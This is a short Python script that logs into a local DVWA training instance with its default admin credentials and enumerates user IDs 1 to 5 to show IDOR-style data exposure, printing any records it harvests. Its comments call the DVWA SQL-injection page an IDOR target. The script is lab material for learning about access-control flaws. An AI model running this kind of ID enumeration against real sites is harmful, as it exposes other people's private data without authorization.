import requests
from bs4 import BeautifulSoup

# Configuration
LOGIN_URL = "http://localhost/login.php"
# We target the user search page.
# In a real IDOR, changing "id=1" to "id=2" leaks other people's data.
TARGET_URL = "http://localhost/vulnerabilities/sqli/"

USERNAME = "admin"
PASSWORD = "password"

session = requests.Session()

def login():
    """Logs into DVWA."""
    print(f"[*] Logging in to {LOGIN_URL}...")
    try:
        response = session.get(LOGIN_URL)
        soup = BeautifulSoup(response.text, "html.parser")
        user_token = soup.find("input", {"name": "user_token"})['value']
        
        login_data = {
            "username": USERNAME,
            "password": PASSWORD,
            "Login": "Login",
            "user_token": user_token
        }
        
        response = session.post(LOGIN_URL, data=login_data)
        if "Welcome to Damn Vulnerable Web Application" in response.text:
            print("[+] Login Successful!")
            return True
        else:
            print("[-] Login Failed.")
            return False
    except Exception as e:
        print(f"[-] Connection Error: {e}")
        return False

def test_idor():
    """Iterates through IDs to see if we can access other users' data."""
    print(f"\n[*] Starting IDOR/Access Control Scan on: {TARGET_URL}")
    print("[*] Attempting to harvest user data by changing ID parameters...")
    
    # We will try to access user IDs 1 through 5
    for user_id in range(1, 6):
        params = {
            "id": str(user_id),
            "Submit": "Submit"
        }
        
        response = session.get(TARGET_URL, params=params)
        soup = BeautifulSoup(response.text, "html.parser")
        
        # In DVWA, the result is inside <pre> tags
        results = soup.find_all("pre")
        
        if results:
            for res in results:
                # Clean up the text to look nice
                data = res.text.strip().replace("\n", " | ")
                if "ID:" in data:
                    print(f"    [!!!] DATA LEAKED (IDOR) for ID {user_id}: {data}")
        else:
            print(f"    [-] No data found for ID {user_id}")

if __name__ == "__main__":
    if login():
        test_idor()